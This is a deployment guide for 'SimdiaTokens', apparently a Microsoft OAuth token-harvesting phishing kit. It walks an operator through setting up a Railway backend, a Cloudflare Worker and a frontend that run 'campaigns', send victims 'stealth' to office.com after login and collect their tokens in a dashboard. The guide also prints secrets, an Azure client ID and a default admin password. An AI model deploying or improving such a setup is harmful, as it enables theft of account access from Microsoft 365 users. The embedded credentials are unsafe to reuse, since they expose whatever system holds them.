# SimdiaTokens — Production Deployment Guide (New Backend)

## Your Secrets (SAVE THESE)

```
MASTER_SECRET=csWyVQrZu0A51ZHRNojAbEGP7YxaGlA4
JWT_SECRET=B9V42Z69E6oZFX7G9xF85BznXqmnVKMe
```

---

## Step 1: Deploy New Backend to Railway (5 minutes)

### 1.1 Create New Railway Service

1. Go to [Railway Dashboard](https://railway.app/dashboard)
2. Click **New Project** → **Deploy from GitHub repo**
3. Select your SimdiaTokens repo
4. **Service name:** `simdiatokens-api-v2`
5. **Root directory:** `SimdiaTokens/simdiatokens_server`
6. Railway auto-detects `Dockerfile` — confirm builder is set to Docker

### 1.2 Add Persistent Volume

1. In your new service → **Volumes** tab
2. Click **New Volume**
3. **Mount path:** `/app/data`
4. **Size:** 1GB

### 1.3 Paste Environment Variables

1. Service → **Variables** tab
2. Click **Raw Editor** (or paste line by line)
3. Open file: `SimdiaTokens/simdiatokens_server/.railway.env`
4. Copy everything from that file
5. Paste into Railway Variables
6. **Replace** `PASTE_YOUR_CLIENT_SECRET_HERE` with your real secret:
   - Get it from your **OLD Railway backend** → Variables → `CLIENT_SECRET`
   - Or regenerate in [Azure Portal](https://portal.azure.com) → Azure AD → App Registrations → Certificates & Secrets

### 1.4 Deploy

Click **Deploy**. Wait ~2 minutes for build.

### 1.5 Verify

Visit your new Railway URL (shown in dashboard):
```
https://simdiatokens-api-v2-xxx.up.railway.app/
```

Should return:
```json
{"name":"SimdiaTokens API","version":"2.0.0","status":"operational"}
```

**Copy this URL** — you need it for the Worker and Frontend.

---

## Step 2: Update Cloudflare Worker (2 minutes)

### Option A: Update Existing Worker (Recommended)

1. Go to [Cloudflare Workers Dashboard](https://dash.cloudflare.com)
2. Find `simdiatokens-oauth-worker`
3. Go to **Settings → Variables**
4. Update these 3 values:

```
MAIN_SERVER=https://your-new-backend.railway.app   <-- paste your Railway URL
CLIENT_ID=8bd2f03a-e0fb-490e-9c02-212c0d96dff4
REDIRECT_URI=https://simdiatokens-oauth-worker.lubaking-co.workers.dev/oauth/callback
```

5. Go to **Edit Code**
6. Replace entire file with contents of:
   `worker/simdiatokens-oauth-worker/src/index.js`
7. Click **Deploy**

### Option B: Create New Worker

Only do this if you want a completely separate worker.

1. [Cloudflare Workers](https://dash.cloudflare.com) → **Create a Service**
2. Name: `simdiatokens-oauth-worker-v2`
3. Paste code from `src/index.js`
4. Add environment variables (same as above)
5. **CRITICAL:** Add redirect URI to Azure AD:
   - [Azure Portal](https://portal.azure.com) → Azure AD → App Registrations
   - Find app `8bd2f03a-e0fb-490e-9c02-212c0d96dff4`
   - Authentication → Add platform → Web
   - Add: `https://your-new-worker.workers.dev/oauth/callback`

### 2.1 Test

Visit:
```
https://simdiatokens-oauth-worker.lubaking-co.workers.dev/status
```

Should show your new backend URL.

---

## Step 3: Connect Local Frontend (1 minute)

### 3.1 Update `.env.local`

Open `SimdiaTokens-frontend/.env.local` and replace with:

```bash
NEXT_PUBLIC_API_URL=https://your-new-backend.railway.app
NEXT_PUBLIC_WORKER_URL=https://simdiatokens-oauth-worker.lubaking-co.workers.dev
```

### 3.2 Restart Frontend

```bash
npm run dev
```

### 3.3 Test the Full Flow

1. Open `http://localhost:3000`
2. Login: `admin / admin12345`
3. Go to **Campaigns**
4. Click **"Start OAuth Flow"**
5. Microsoft login opens → authenticate
6. Redirected to office.com (stealth)
7. New token appears in dashboard!

---

## Step 4: Deploy Frontend to Vercel (Optional)

When you're ready to go live:

1. [Vercel Dashboard](https://vercel.com) → Import GitHub repo
2. **Root directory:** `SimdiaTokens-frontend`
3. **Framework:** Next.js
4. Environment variables:

```bash
NEXT_PUBLIC_API_URL=https://your-new-backend.railway.app
NEXT_PUBLIC_WORKER_URL=https://simdiatokens-oauth-worker.lubaking-co.workers.dev
```

5. Deploy
6. After deploy, update Railway:
   - `FRONTEND_URL=https://your-frontend.vercel.app`

---

## What Each File Does

| File | Purpose |
|------|---------|
| `simdiatokens_server/.railway.env` | Pre-filled Railway variables (paste into dashboard) |
| `simdiatokens_server/Dockerfile` | Build instructions for Railway |
| `worker/simdiatokens-oauth-worker/src/index.js` | Cloudflare Worker code (paste into dashboard) |
| `worker/simdiatokens-oauth-worker/.wrangler.env` | Worker env vars reference |
| `DEPLOY.md` | This guide |

---

## Troubleshooting

**"CORS error"**
→ Check `FRONTEND_URL` in Railway matches your frontend domain exactly

**"Invalid client secret"**
→ `CLIENT_SECRET` has extra spaces or wrong value. Copy directly from Azure portal.

**"Token not found after OAuth"**
→ Worker `MAIN_SERVER` points to old backend. Update to new Railway URL.

**"Database not persisting"**
→ Railway volume not mounted at `/app/data`. Check Volumes tab.

---

## Security Checklist

- [x] Generated strong `MASTER_SECRET` and `JWT_SECRET`
- [ ] Changed default admin password (`admin12345`)
- [ ] Verified Azure AD redirect URI is correct
- [ ] Added Railway volume for database persistence
- [ ] Restricted CORS `FRONTEND_URL` after Vercel deploy
